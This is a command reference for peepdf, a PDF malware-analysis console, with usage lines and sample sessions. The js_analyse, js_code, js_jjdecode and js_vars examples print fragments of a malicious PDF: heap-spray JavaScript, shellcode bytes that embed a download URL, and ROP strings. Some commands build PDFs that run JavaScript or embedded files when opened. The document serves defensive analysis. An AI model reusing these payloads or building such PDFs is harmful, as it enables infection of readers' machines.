**Console commands**

There are a lot of commands that can be used in the interactive console of peepdf. They are listed below:

```
Showing information

    bytes
    case_report
    changelog
    errors
    extract
    extract_stream
    hash
    info
    json
    metadata
    object
    objects
    ocr
    offsets
    pieceinfo
    rawobject
    rawstream
    references
    save_version
    signatures
    stream
    streams
    tree
    xml
    xref
```

```
Creation/Modification

    create
    decode
    decrypt
    embed
    encode
    encode_strings
    encrypt
    filters
    malformed_output
    modify
    save
```

```
Javascript analysis (requires STPyV8)

    js_analyse
    js_beautify
    js_code
    js_eval
    js_jjdecode
    js_join
    js_unescape
    js_vars
```

``` 
Shellcode analysis (requires libemu and pylibemu)

    sctest
```

```
Misc

    replace
    search
    set
    show
    vtcheck
    xor
    xor_search
```

```
Console

    clear
    exit
    help
    log
    open
    quit
    reset
```

## bytes

```
Usage: bytes offset num_bytes [hex] [file]

Show or store in the specified file "num_bytes" of the file beginning from "offset"

Use "hex" to get a hex-formatted output regardless of the content. To dump the result to a file when using "hex", give "hex" first and then the file name.

PPDF> bytes 0 100

%PDF-1.1

1 0 obj <

    > endobj

2 0 obj <

PPDF> bytes 0 40 hex

25 50 44 46 2d 31 2e 37 0d 0a 25 b5 b5 b5 b5 0d   |%PDF-1.7..%.....|
0a 31 20 30 20 6f 62 6a 0d 0a 3c 3c 2f 54 79 70   |.1 0 obj..<</Typ|
65 2f 43 61 74 61 6c 6f                           |e/Catalo        |
```
## case_report

```
Usage: case_report [nojs] [html] $file_name

Exports a consolidated case report (hashes, metadata, changelog, JS/vuln findings, digital signatures) to $file_name. The report is JSON by default.

nojs: leave the JavaScript findings out of the report. Otherwise the report states what JS analysis was actually performed on the open document (full, if it was analysed with deobfuscation; summary, if not)
html: write a human-readable HTML report instead of JSON

PPDF> case_report nojs report.json

[+] Case report (32628 bytes) written to file report.json

PPDF> case_report html report.html

[+] Case report (2643 bytes) written to file report.html
```
## changelog

```
Usage: changelog [version] [detailed]

Show the changelog of the document or version of the document. Every version is also checked for objects present in the body but not declared in its xref table (hidden objects), for objects in the xref but not in the body (missing), for a trailer /Size that doesn't match the highest object id actually present, and for body object or stream counts that don't match the actual object / stream data.

detailed: also show, for every modified object, a key-by-key diff between the two versions

PPDF> changelog

Changes in version 1:
	Producer: Acrobat Web Capture 8.0
	Modification date: 2009-03-05T21:46:22+08:00
	Added objects: [48]
	Modified objects: [27, 29, 31]

PPDF> changelog detailed

-- snip --

Changes in version 2: 
	Title: 
	Author: Test PDF Author
	Creator: Acrobat PDFMaker 22 for Word
	Producer: Adobe PDF Library 22.3.86
	Modification date: D:20230925132114-04'00'
	Added objects: [120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130]
	Modified objects (3, version 1 -> 2): [2, 90, 93]

Object 2:
    ~ /Length: 3886 -> 3885
    Stream changed: 3886 -> 3885 bytes

Object 90:
    ~ /ModDate: D:20230925131933-04'00' -> D:20230925132114-04'00'

Object 93:
    ~ /Contents: [ 95 0 R 96 0 R 97 0 R 98 0 R 99 0 R 100 0 R 101 0 R 102 0 R ] -> 121 0 R
```
## clear

```
Usage: clear

Clears the screen
```
## create

```
Usage: create pdf (simple | open_action_js [$js_file])

Creates a new simple PDF file or one with Javascript code to be executed when opening the file.

It is possible to specify the file where the Javascript code is stored or do it manually.

PPDF> create pdf open_action_js

Please, specify the Javascript code you want to include in the file (if the code includes EOL characters use a js_file instead):

app.alert("Hello World!!",3);

PDF structure created successfully! The Javascript code specified here will be executed when the document is opened.

-------

Usage: create object_stream [$version]

Creates an object stream choosing the objects to be compressed.

PPDF> create object_stream

Warning: stream objects cannot be compressed. If the Catalog object is compressed could lead to corrupted files for Adobe Reader!! Which objects do you want to compress? (Valid respones: all | 1-5 | 1,2,5,7,8) all

[*] Warning: Stream objects cannot be compressed!

The object stream has been created successfully 
```
Stream objects (and the encryption dictionary) are not compressed: the PDF specification doesn't allow it, so they are skipped and reported in the warning, and every other selected object goes into the new object stream.

The command fails, and leaves the document exactly as it was, when:

- There is nothing left to compress (for example, every selected object is a stream): `There are no objects to compress`.
- The document is encrypted and was not decrypted, so the new object stream can't be encrypted with the document's key: `The document is encrypted and was not decrypted`.
- A selected object doesn't exist and force mode is off.

## decode

```
Usage: decode variable var_name filter1 [filter2 ...]
Usage: decode file file_name filter1 [filter2 ...]
Usage: decode raw offset num_bytes filter1 [filter2 ...]
Usage: decode string encoded_string filter1 [filter2 ...]

Decode the content of the specified variable, file, raw bytes or string using the following filters or algorithms:
  base64,b64: Base64
  asciihex,ahx: /ASCIIHexDecode
  ascii85,a85: /ASCII85Decode
  lzw: /LZWDecode
  flatedecode,fl: /FlateDecode
  runlength,rl: /RunLengthDecode
  ccittfax,ccf: /CCITTFaxDecode
  jbig2: /JBIG2Decode (Not implemented)
  dct: /DCTDecode
  jpx: /JPXDecode

PPDF> bytes 70 37

78 9c 4b 2c 28 d0 4b cc 49 2d 2a d1 50 f2 48 cd |x.K,(.K.I-*.P.H.|
c9 c9 57 08 cf 2f ca 49 51 54 54 d2 31 d6 b4 06 |..W../.IQTT.1...|
00 96 69 09 15                                  |..i..           |

PPDF> decode raw 70 37 fl

app.alert("Hello World!!",3);

PPDF> decode string SGVsbG8gd29ybGQ= base64

Hello world
```
## decrypt

```
Usage: decrypt $password

Decrypts the file with the specified password
```
## embed

```
Usage: embed [-x] filename [file_type]

Embed the specified file in the actual PDF file. The default type is "application/pdf".

Options: -x: The file is executed when the actual PDF file is opened
```
## encode

```
Usage: encode variable var_name filter1 [filter2 ...]
Usage: encode file file_name filter1 [filter2 ...]
Usage: encode raw offset num_bytes filter1 [filter2 ...]
Usage: encode string my_string filter1 [filter2 ...]

Encode the content of the specified variable, file, raw bytes or string using the following filters or algorithms:
  base64,b64: Base64
  asciihex,ahx: /ASCIIHexDecode
  ascii85,a85: /ASCII85Decode (in beta)
  lzw: /LZWDecode
  flatedecode,fl: /FlateDecode
  runlength,rl: /RunLengthDecode (in beta)
  ccittfax,ccf: /CCITTFaxDecode
  jbig2: /JBIG2Decode (Not implemented)
  dct: /DCTDecode
  jpx: /JPXDecode

PPDF> bytes 49 29

app.alert("Hello World!!",3);

PPDF> encode raw 49 29 fl

78 9c 4b 2c 28 d0 4b cc 49 2d 2a d1 50 f2 48 cd |x.K,(.K.I-*.P.H.|
c9 c9 57 08 cf 2f ca 49 51 54 54 d2 31 d6 b4 06 |..W../.IQTT.1...|
00 96 69 09 15                                  |..i..           | 

PPDF> encode string Hello asciihex

48656c6c6f
```
## encode_strings

```
Usage: encode_strings [id|trailer [version]]

Encode the strings and names included in the file, object or trailer

PPDF> rawobject 2

<< /Kids [ 3 0 R ] /Type /Pages /Count 1 >>

PPDF> encode_strings 2

Object encoded successfully

PPDF> rawobject 2

<< /#4b#69#64#73 [ 3 0 R ] /#54#79#70#65 /#50#61#67#65#73 /#43#6f#75#6e#74 1 >> 

PPDF> rawobject 4

(This is a test string object!!)

PPDF> encode_strings 4

Object encoded successfully

PPDF> rawobject 4

(\124\150\151\163\040\151\163\040\141\040\164\145\163\164\040\163\164\162\151\156\147\040\157\142\152\145\143\164\041\041)
```
## encrypt

```
Usage: encrypt [password] [rc4|aes|aes256]

Encrypt the file with the default or specified password, using RC4 (default, 128-bit), AES (AESV2, 128-bit) or AES256 (AESV3, 256-bit)
```
## errors

```
Usage: errors [object_id|xref|trailer [version]]

Shows the errors of the file or object (object_id, xref, trailer)

PPDF> errors

Bad object for /XObject key (1)
No entries in xref section (1)
```
## exit

```
Usage: exit

Exits from the console
```
## extract

```
Usage: extract uri|js [version]

Extracts all the given type elements of the specified version after being decoded and decrypted (if necessary)

PPDF> extract js

// peepdf comment: Javascript code located in object 3 (version 0)

function showAlert() {
    alert("Alert from JS file");
}

PPDF> extract uri

http://java.sun.com/global/mh/suncom/index.html 223
http://java.sun.com/global/mh/java/ 224
http://java.sun.com/global/mh/solaris/ 225
-- snip --
```
## extract_stream

```
Usage: extract_stream object_id [version] [raw] file_name

Extracts the stream content of the specified object straight to a file. By default the DECODED stream is written (filters removed). Use the "raw" option to write the stream exactly as stored in the file, before decoding.

PPDF> extract_stream 4 stream4.txt

[+] Stream content (43 bytes) written to file stream4.txt

PPDF> extract_stream 4 raw stream4.bin

[+] Stream content (208 bytes) written to file stream4.bin
```
## filters

```
Usage: filters object_id [version] [filter1 [filter2 ...]]

Shows the filters found in the stream object or set the filters in the object (first filter is used first).
The valid values for filters are the following:
  none: No filters
  asciihex,ahx: /ASCIIHexDecode
  ascii85,a85: /ASCII85Decode (in beta)
  lzw: /LZWDecode
  flatedecode,fl: /FlateDecode
  runlength,rl: /RunLengthDecode (in beta)
  ccittfax,ccf: /CCITTFaxDecode (Not implemented)
  jbig2: /JBIG2Decode (Not implemented)
  dct: /DCTDecode (Not implemented)
  jpx: /JPXDecode (Not implemented)
  
PPDF> rawobject 5

<< /Length 37 /Filter /FlateDecode >> stream x�K,(�K�I-*�P�H����/�IQTT�1ִ�i  endstream

PPDF> filters 5

/FlateDecode

PPDF> filters 5 none

<< /Length 29 >> stream app.alert("Hello World!!",3); endstream

PPDF> rawobject 5

<< /Length 29 >> stream app.alert("Hello World!!",3); endstream

PPDF> filters 5

[*] Warning: No filters found in the object!!

PPDF> filters 5 fl ahx

<< /Length 74 /Filter [ /ASCIIHexDecode /FlateDecode ] >> stream 789c4b2c28d04bcc492d2ad150f248cdc9c95708cf2fca49515454d231d6b4060096690915 endstream
```
## hash

```
Usage: hash object|rawobject|stream|rawstream object_id [version]
Usage: hash raw offset size
Usage: hash file fileName
Usage: hash variable varName
Usage: hash string my_string

Generates the hash (MD5/SHA1/SHA256) of the specified source: raw bytes of the file, objects and streams, and the content of files, variables or strings. The hash of a raw stream is taken over the stream data only (see "rawstream")

PPDF> hash rawstream 10

MD5: 9212aff46b662808a613f11b4d9d3673
SHA1: 1fbf5269f10a36f4863cfa4e14188537efd23ca1
SHA256: 7b2b2f2b33ec2531769bd457f20d13e177aee04ac59a06a02fad1a7abcfa4c14

PPDF> hash variable myVar

MD5: 852ce9336716bd31de5fca2587c2f156
SHA1: 7632ca7738817cf66d8f772430be8db7b00aac96
SHA256: b2a4305f1fa2d2d1a1bb363cbb1e6680161d78b89beb3aafe160ff1d694426b2

PPDF> hash string hello

MD5: 5d41402abc4b2a76b9719d911017c592
SHA1: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
SHA256: 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824
```
## help

```
Usage: help [command]

Show the available commands or the usage of the specified command
```
## info

```
Usage: info [object_id|xref|trailer [version]]

Shows information of the file or object (object_id, xref, trailer)

PPDF> info

File: sample-pdf.pdf
Title: Microsoft Word Document - Sample PDF.docx
MD5: f2f5077a7f54cce68eed0474b7a4fc58
SHA1: a0eff357abde1f344ffaefc259af9078db4489a4
SHA256: 873f562bfc0ab637038eaa453ec29ae6e6c37fd1f21bae06a6191c8be62fe654
Size: 45862 bytes
IDs:
	Version 0: [ <16040301AA07064EA7E0CA859CA43CF0> <335C8E1835857545ACCEFA87BB9F5387> ]
	Version 1: [ <16040301AA07064EA7E0CA859CA43CF0> <335C8E1835857545ACCEFA87BB9F5387> ]
PDF Format Version: 1.6
Binary: True
Linearized: True
Encrypted: False
Updates: 5
Objects: 177
Streams: 53
URIs: 2
Comments: 0
Errors: 0

Version 0:
	Catalog: 92
	Info: 90
	Objects (2): [91, 110]
	Streams (1): [110]
	Xref streams (1): [110]
	Encoded (1): [110]

Version 1:
	Catalog: 92
	Info: 90
	Objects (117): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 111, 112, 113, 114, 115, 116, 117, 118, 119]
	Compressed objects (93): [111, 112, 113, 114, 115, 116, 117, 118, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90]
	Streams (22): [119, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 1, 2, 3, 4, 5]
	Xref streams (1): [5]
	Object streams (4): [94, 1, 3, 4]
	Encoded (21): [119, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 1, 3, 4, 5]
	Objects with URIs (2): [59, 61]

PPDF> info 398

Offset: 3916
Size: 526
MD5: a0c01bd5af0bca2c720245787bf6b53c
Object: stream
Stream MD5: f08f297fabf29713ad078aee11bb022c
Raw Stream MD5: 0b4d200f39e4c6375b1115e0ffd8f2ac
Length: 426
Encoded: Yes 
Filters: /FlateDecode
Filter Parameters: No 
Decoding errors: No 
References: []
```
For a stream, "Length" is the /Length the file declares, and the "Raw Stream" hashes are taken over the stream data only (the end-of-line marker before "endstream" is not part of the stream). "Real length" is only shown when the stream data has a different length than the one declared, which can point to a tampered or damaged stream:

```
PPDF> info 5

Offset: 6027
Size: 88
MD5: 40aa1a2a7a2f33f361f10f1645813ae7
Object: stream
Stream MD5: 8e0099335f841651200d4b413fcd4230
Length: 44
Real length: 39
Encoded: No 
References: []
```
## js_analyse

```
Usage: js_analyse variable var_name
Usage: js_analyse file file_name
Usage: js_analyse object object_id [version]
Usage: js_analyse string javascript_code

Analyses the Javascript code stored in the specified string, variable, file or object This command perform some substitutions in the code in order to obtain the last stage of the Javascript code and search for escaped bytes and shellcodes. It's not always possible to be successful with this analysis, so maybe a manual approach with other commands will be necessary.

PPDF> js_analyse object 13

Javascript code:

var tX1PnUHy = new Array(); function lRUWC(E79yB, NPvAvQ){ while (E79yB.length * 2 < NPvAvQ){ E79yB += E79yB; } E79yB = E79yB.substring(0, NPvAvQ / 2); return E79yB; } function YVYohZTd(bBeUHg){ var NTLv7BP = 0x0c0c0c0c; rpifVgf = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001%uef33" + "%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef%u64ef%ue3af%u9f64%u42f3%u9f64"+ "%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1%u0703%uef11%uefef%uaa66%ub9eb%u7787"+ "%u6511%u07e1%uef1f%uefef%uaa66%ub9e7%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3"+ "%u0087%u0f21%u078f%uef3b%uefef%uaa66%ub9ff%u2e87%u0a96" + "%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa%ue806%uefee%ub1ef%u9a66"+ "%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9%u9fc0%u7807%uefef"+ "%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb%ub6ed%uba64"+ "%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf..."

Unescaped bytes:

43 43 43 43 eb 0f 5b 33 c9 66 b9 80 01 80 33 ef |CCCC..[3.f....3.|
43 e2 fa eb 05 e8 ec ff ff ff 7f 8b 4e df ef ef |C..........N....|
ef 64 af e3 64 9f f3 42 64 9f e7 6e 03 ef eb ef |.d..d..Bd..n....|
ef 64 03 b9 87 61 a1 e1 03 07 11 ef ef ef 66 aa |.d...a........f.|
eb b9 87 77 11 65 e1 07 1f ef ef ef 66 aa e7 b9 |...w.e......f...|
87 ca 5f 10 2d 07 0d ef ef ef 66 aa e3 b9 87 00 |.._.-.....f.....|
21 0f 8f 07 3b ef ef ef 66 aa ff b9 87 2e 96 0a |!...;...f.......|
57 07 29 ef ef ef 66 aa fb af 6f d7 2c 9a 15 66 |W.)...f...o.,..f|
aa f7 06 e8 ee ef ef b1 66 9a cb 64 aa eb 85 ee |........f..d....|
b6 64 ba f7 b9 07 64 ef ef ef bf 87 d9 f5 c0 9f |.d....d.........|
07 78 ef ef ef 66 aa f3 64 2a 6c 2f bf 66 aa cf |.x...f..d*l/.f..|
87 10 ef ef ef bf 64 aa fb 85 ed b6 64 ba f7 07 |......d.....d...|
8e ef ef ef ec aa cf 28 ef b3 91 c1 8a 28 af eb |.......(.....(..|
97 8a ef ef 10 9a cf 64 aa e3 85 ee b6 64 ba f7 |.......d.....d..|
07 af ef ef ef 85 e8 b7 ec aa cb dc 34 bc bc 10 |............4...|
9a cf bf bc 64 aa f3 85 ea b6 64 ba f7 07 cc ef |....d.....d.....|
ef ef 85 ef 10 9a cf 64 aa e7 85 ed b6 64 ba f7 |.......d.....d..|
07 ff ef ef ef 85 10 64 aa ff 85 ee b6 64 ba f7 |.......d.....d..|
07 ef ef ef ef ae b4 bd ec 0e ec 0e ec 0e ec 0e |................|
6c 03 eb b5 bc 64 35 0d 18 bd 10 0f ba 64 03 64 |l....d5......d.d|
92 e7 64 b2 e3 b9 64 9c d3 64 9b f1 97 ec 1c b9 |..d...d..d......|
64 99 cf ec 1c dc 26 a6 ae 42 ec 2c b9 dc 19 e0 |d.....&..B.,....|
51 ff d5 1d 9b e7 2e 21 e2 ec 1d af 04 1e d4 11 |Q......!........|
b1 9a 0a b5 64 04 64 b5 cb ec 32 89 64 e3 a4 64 |....d.d...2.d..d|
b5 f3 ec 32 64 eb 64 ec 2a b1 b2 2d e7 ef 07 1b |...2d.d.*..-....|
11 10 10 ba bd a3 a2 a0 a1 ef 68 74 74 70 3a 2f |..........http:/|
2f 62 69 6b 70 61 6b 6f 63 2e 63 6e 2f 6e 75 63 |/bikpakoc.cn/nuc|
2f 65 78 65 2e 70 68 70                         |/exe.php        |

URLs in shellcode: http://bikpakoc.cn/nuc/exe.php
```
## js_beautify

```
Usage: js_beautify variable var_name
Usage: js_beautify file file_name
Usage: js_beautify object object_id [version]
Usage: js_beautify string javascript_code

Beautifies the Javascript code stored in the specified string, variable, file or object 

PPDF> stream 15

function yyy(){while(1>2) ;}

function datagood(a,b) { if (a>b) {datagood(a,b)} if (b>a) {datagood(a,b)} return a; }

PPDF> js_beautify object 15

function yyy() {
    while (1 > 2);
}

function datagood(a, b) {
    if (a > b) {
        datagood(a, b)
    }
    if (b > a) {
        datagood(a, b)
    }
    return a;
}
```
## js_code

```
Usage: js_code object_id [version]

Shows the Javascript code found in the object If the Javascript code found in the object can be executed and generates another Javascript code stage all the stages can be shown.

PPDF> js_code 13

There are more than one Javascript code, do you want to see all (1) or just the last one (2)? 1

================== Original Javascript code ==================

function nofaq(lgc){var ppwsd="";for(rxr=0;rxr
nofaq("0D0A6452...");

================== Next stage of Javascript code ==================

var tX1PnUHy = new Array(); function lRUWC(E79yB, NPvAvQ){ while (E79yB.length * 2 < NPvAvQ){ E79yB += E79yB; } E79yB = E79yB.substring(0, NPvAvQ / 2); return E79yB; } function YVYohZTd(bBeUHg){ var NTLv7BP = 0x0c0c0c0c; rpifVgf = unescape("%u4343%u4343%u0feb%u335b%u66c9%u80b9%u8001..."); if (bBeUHg == 1){NTLv7BP = 0x30303030;}

    var i388Ag8 = 0x400000;
    var JKn0PaC = rpifVgf.length * 2;
    var NPvAvQ = i388Ag8 - (JKn0PaC + 0x38);
    var E79yB = unescape("%u9090%u9090");
    E79yB = lRUWC(E79yB, NPvAvQ);
    var fwdFfLgn = (NTLv7BP - 0x400000) / i388Ag8;
    for (var HEUAQgED = 0; HEUAQgED < fwdFfLgn; HEUAQgED ++ ){
    tX1PnUHy[HEUAQgED] = E79yB + rpifVgf;

} }
...

```
## js_eval

```
Usage: js_eval variable var_name
Usage: js_eval file file_name
Usage: js_eval object object_id [version]
Usage: js_eval string javascript_code

Executes the Javascript code stored in the specified string, variable, file or object 

PPDF> set jscode "var a = 8; a = a + 2; print('The content of the variable is '+a);"

PPDF> js_eval variable jscode

The variable may not contain Javascript code, do you want to continue? (y/n) y The content of the variable is 10
```
First, we put Javascript code in a variable. After that we can use the js_eval command to execute it. There is a warning because the code is very short to be identified as Javascript code.

## js_jjdecode

```
Usage: js_jjdecode variable $var_name
Usage: js_jjdecode file $file_name
Usage: js_jjdecode object $object_id [$version]
Usage: js_jjdecode string $encoded_js_code

Decodes the Javascript code stored in the specified string, variable, file or object using the jjencode/decode algorithm by Yosuke Hasegawa (http://utf-8.jp/public/jjencode.html)

PPDF> show encoded_stream

Q=~[];Q={:++Q,$$$$:(![]+"")[Q],$:++Q,$$_:(![]+"")[Q],$:++Q,$_$$:({}+"")[Q],$$_$:(Q[Q]+"")[Q],$$:++Q,$$$:(!""+"")[Q],$__:++Q,$_$:++Q,$$__:({}+"")[Q],$$_:++Q,$$$:++Q,$___:++Q,$__$:++Q};Q.$_=(Q.$_=Q+"")[Q.$_$]+(Q.$=Q.$[Q.$])+(Q.$$=(Q.$+"")[Q.$])+((!Q)+"")[Q.$$]+(Q.=Q.$[Q.$$_])+(Q.$=(!""+"")[Q.$])+(Q.=(!""+"")[Q.$_])+Q.$_[Q.$_$]+Q.+Q.$+Q.$;Q.$$=Q.$+(!""+"")[Q.$$]+Q.+Q._+Q.$+Q.$$; [...]

PPDF> js_jjdecode variable encoded_stream

var shellcode = unescape("%u00E8..."); var executable = ""; var rop9 = ""; rop9 += unescape("%u313d%u4a82"); rop9 += unescape("%ua713%u4a82"); rop9 += unescape("%u1f90%u4a80"); [...]
```
## js_join

```
Usage: js_join variable var_name
Usage: js_join file file_name
Usage: js_join string my_string

Joins some strings separated by quotes and stored in the specified variable, file or string in a unique one

Example:

PPDF> set aux '"%u65"+"54"+"%u74"+"73"'

PPDF> js_join variable aux

%u6554%u7473
```
## js_unescape

```
Usage: js_unescape variable var_name
Usage: js_unescape file file_name
Usage: js_unescape string escaped_string

Unescapes the escaped characters stored in the specified variable, file or string

Example:

PPDF> set aux "%u6554%u7473"

PPDF> js_unescape variable aux

54 65 73 74                                       |Test            |
```
## js_vars

```
Usage: js_vars [$var_name]

Shows the Javascript variables defined in the execution context or the content of the specified variable

PPDF> js_vars

['shellcode', 'executable', 'rop9', 'rop10', 'rop11', 'r11', 'obj_size', 'rop', 'ret_addr', 'rop_addr', 'r_addr', 'payload', 'vv', 'part1', 'part2', 'part2_len', 'arr', 'heapSpray', 'evalCode']

PPDF> js_vars obj_size

844 
```
## json
```
Usage: json

Shows the info for the currently loaded file in JSON format
```
## log

```
Usage: log

Show the actual state of logging

Usage: log stop

Stop logging

Usage: log log_file

Starts logging in the specified file
```
## malformed_output

```
Usage: malformed_output [$option1 [$option2 ...] [$header_file]]

Enable malformed output when saving the file:

0: Removes all the malformed options.
1: [header_file]: Enable all the implemented tricks. Default option.
2: [header_file]: Puts the default or specified header before the PDF header.
3: Removes all the "endobj" tags.
4: Removes all the "endstream" tags.
5: Removes the "xref" section.
6: Bad header: %PDF-1

```
## metadata

```
Usage: metadata [version] [detailed]

Show the metadata of the document or version of the document, including any /PieceInfo found anywhere in the document (see "pieceinfo" to view just that on its own, per version)

detailed: also show the raw /Info dictionary and the XMP stream contents

PPDF> metadata

(Run "metadata detailed" to also see the raw /Info dictionary and XMP stream contents.)

Version 0 metadata summary: 

  Title: 
  Author: Test PDF Author
  Creator: Acrobat PDFMaker 22 for Word
  Producer: Adobe PDF Library 22.3.86
  Creation date: D:20230925131929-04'00'
  Modification date: D:20231007144138-04'00'
  Subject: 

Version 1 metadata summary: 

  Title: 
  Author: Test PDF Author
  Creator: Acrobat PDFMaker 22 for Word
  Producer: Adobe PDF Library 22.3.86
  Creation date: D:20230925131929-04'00'
  Modification date: D:20231007144138-04'00'
  Subject: 

  XMP DocumentID: uuid:15dc9243-e0bf-43c4-b898-fcccdf721288
  XMP InstanceID: uuid:4142976e-51fd-44f2-aec0-34c287b7e59c

PPDF> metadata detailed

-- snip --

Info Object in version 0: 

<< /Author Test PDF Author
/Comments 
/Company 
/CreationDate D:20230925131929-04'00'
/Creator Acrobat PDFMaker 22 for Word
/Keywords 
/ModDate D:20231007144138-04'00'
/Producer Adobe PDF Library 22.3.86
/SourceModified 
/Subject 
/Title  >>
```
## modify

```
Usage: modify object|stream id [version] [file]

Modify the object or stream specified. It's possible to use a file to retrieve the stream content (ONLY for stream content).

PPDF> object 4

<< /Kids [ 9 0 R ] /Count 1 /Resources 8 0 R /Type /Pages >>

PPDF> modify object 4

Key: /Kids
Raw value: [ 9 0 R ]

Do you want to modify, delete or make no action? (m/d/n) n

Key: /Count
Raw value: 1
Value: 1

Do you want to modify, delete or make no action? (m/d/n) m

Raw value: 1

Do you want to modify, delete or make no action? (m/d/n) m

Please, specify the number object content:

18

Key: /Resources
Raw value: 8 0 R

Do you want to modify, delete or make no action? (m/d/n) m

Raw value: 8 0 R

Do you want to modify, delete or make no action? (m/d/n) m

Please, specify the reference object content:

1 0 R

Key: /Type
Raw value: /Pages

Do you want to modify, delete or make no action? (m/d/n) n

Do you want to add more entries? (y/n) n

Object modified successfully!!

PPDF> object 4

<< /Kids [ 9 0 R ] /Count 18 /Resources 1 0 R /Type /Pages >>
```
The file holds the new content: for `modify stream` the whole stream (any bytes, and it's compressed again if the stream has a filter), for `modify object` the value of a simple object (number, string or hex string), where a trailing line break is ignored. A value that doesn't fit the object's type leaves the object unchanged.

For an array or a dictionary the file holds the whole new object in PDF syntax, which replaces the old one (nested arrays, dictionaries, strings and references are fine). It must be an array for an array and a dictionary for a dictionary, with every `[`, `<<`, `(` and `<` closed and nothing after it, otherwise nothing is changed. What `rawobject` shows can be given back as it is, including the `4 0 obj` ... `endobj` around it, as long as the number is the object's own. That makes editing an object from the command line a matter of `rawobject 4 > object4.txt`, editing the file and `modify object 4 object4.txt`. The new content of a stream object (as opposed to its dictionary) is given with `modify stream`.

With `-C` `modify` never stops to ask a question, because there is nobody to answer. The new value must be given by file, for a stream, a simple object, an array or a dictionary; anything else fails with an error and leaves the document as it was. In script mode a stream must be given by file too:

```
$ peepdf.py -C "rawobject 4 > object4.txt" file.pdf
$ peepdf.py -C "modify object 4 object4.txt" -C "modify stream 5 new_content.txt" -C "save patched.pdf" file.pdf
[+] Object modified successfully
[+] Object modified successfully
[+] File saved successfully
```
## object

```
Usage: object object_id [version]

Shows the content of the object after being decoded and decrypted.

PPDF> object 1 0

<< /AcroForm 5 0 R
/Threads 2 0 R
/Names 7 0 R
/OpenAction 
  << /S /JavaScript
    /JS this.uSQXcfcd2()
    >> 
/Pages 4 0 R
/Outlines 3 0 R
/Type /Catalog
/PageLayout /SinglePage
/Dests 6 0 R
/ViewerPreferences
  << /PageDirection /L2R
    >>
  >>
```
## objects
```
Usage: objects [version]

Shows all available objects or objects by version

PPDF> objects

Version 0: Objects (40): [1, 2, 3, 5, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43]
Version 1: Objects (7): [5, 7, 36, 44, 45, 46, 47]

PPDF> objects 1

Version 1: Objects (7): [5, 7, 36, 44, 45, 46, 47]

```
## ocr
```
Usage: ocr [$output_filename]
Extract text from the PDF, optional output to file.

Documents over 200 pages get a warning, and an interactive session is asked to confirm before it continues. When a script (-s) or a single command (-C) is run, only the warning is shown and the extraction continues. In the GUI, the Console tab asks in a dialog before running "ocr" on such a document.

PPDF> ocr

Planet PDF JavaScript Learning Center 
Example #2 - 'Run JavaScript on Document Open'
Date:
NOTE: The JavaScript code used for this task can be 
found under 'Advanced > JavaScript > Document 
JavaScripts'

PPDF> ocr PDF_Content.txt

[+] The content has been written to PDF_Content.txt.

PPDF> ocr

[*] Warning: This may take some time, as this file is 756 pages long.
Continue (Y/N)? n
[*] OCR cancelled

```

## offsets

```
Usage: offsets [num_version]

Shows the physical map of the file or the specified version of the document The output of this command shows in a visual way the physical structure of the document. We can see the starting and ending offsets and the size of the elements (in brackets).

PPDF> offsets

Version 0: 
┌───────────┬──────────┬──────────┬─────────────┐
│ Start (d) │ End (d)  │ Size (d) │ Type and Id │
├───────────┼──────────┼──────────┼─────────────┤
│ 00000000  │          │          │ Header      │
│ 00000017  │ 00000191 │ 00000175 │ Object 1    │
│ 00000194  │ 00000247 │ 00000054 │ Object 2    │
│ 00000250  │ 00000525 │ 00000276 │ Object 3    │

-- snip --

│ 00015369  │ 00015377 │ 00000009 │ XrefSection │
│ 00015380  │ 00015557 │ 00000178 │ Trailer     │
│ 00015558  │          │          │ EOF         │
└───────────┴──────────┴──────────┴─────────────┘

```
The size of an object is the number of bytes it takes in the file, from the start of "N 0 obj" to the end of "endobj". This is also true for an encrypted document: the sizes are those of the file, not of the decrypted objects.

## open

```
Usage: open [-fl] filename

Open and parse the specified file

Options:
  -f: Sets force parsing mode to ignore errors
  -l: Sets loose parsing mode for problematic files
```
## pieceinfo

```
Usage: pieceinfo

Shows every /PieceInfo entry found in the document, carrying their own metadata such as DocumentID/OriginalDocumentID/LastModified.

PPDF> pieceinfo

┌────────┬─────────────┬──────────────────────────────────────────────┬──────────────────────────────────────────────┬───────────────────┐
